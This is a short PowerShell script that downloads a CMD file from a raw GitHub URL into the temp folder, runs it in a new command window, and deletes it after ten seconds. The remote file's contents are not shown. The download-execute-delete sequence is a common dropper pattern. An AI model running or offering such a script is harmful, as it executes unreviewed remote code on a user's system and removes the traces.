# Enable TLSv1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URL for the CMD file
$cmdUrl = "https://raw.githubusercontent.com/nizhenets/test/main/ION.cmd"

# Define the temporary file path
$tempPath = "$env:TEMP\ION.cmd"

# Download the CMD file
Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath

# Execute the CMD file in a new CMD window
Start-Process "cmd.exe" -ArgumentList "/c `"$tempPath`""

# Clean up the temporary file after a delay to ensure it runs completely
Start-Sleep -Seconds 10
Remove-Item -Path $tempPath
